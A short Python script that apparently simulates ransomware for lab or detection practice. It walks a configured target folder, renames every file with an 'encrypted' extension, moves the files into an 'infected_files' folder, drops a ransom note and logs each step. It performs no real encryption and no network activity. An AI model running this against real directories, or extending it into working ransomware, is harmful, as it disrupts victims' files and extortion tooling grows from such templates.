import os
from datetime import datetime
from config import TARGET_DIR, ENCRYPT_EXT, RANSOM_NOTE

LOG_FILE = "../logs/ransomware_log.txt"
INFECTED_DIR = "../samples/infected_files"

os.makedirs(INFECTED_DIR, exist_ok=True)

def simulate_ransomware():
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    log = []

    for root, dirs, files in os.walk(TARGET_DIR):
        for file in files:
            if not file.endswith(ENCRYPT_EXT):
                old_path = os.path.join(root, file)
                new_name = file + ENCRYPT_EXT
                new_path = os.path.join(INFECTED_DIR, new_name)
                os.rename(old_path, new_path)
                log.append(f"[{timestamp}] Encrypted: {new_path}")

    # Drop ransom note
    note_path = os.path.join(INFECTED_DIR, "READ_ME_NOW.txt")
    with open(note_path, 'w') as note:
        note.write(RANSOM_NOTE)
    log.append(f"[{timestamp}] Ransom note dropped at {note_path}")

    # Save log
    os.makedirs("../logs", exist_ok=True)
    with open(LOG_FILE, "w") as f:
        f.write("\n".join(log))

    print(f"💀 Simulation complete. Logs saved to {LOG_FILE}")

if __name__ == "__main__":
    simulate_ransomware()
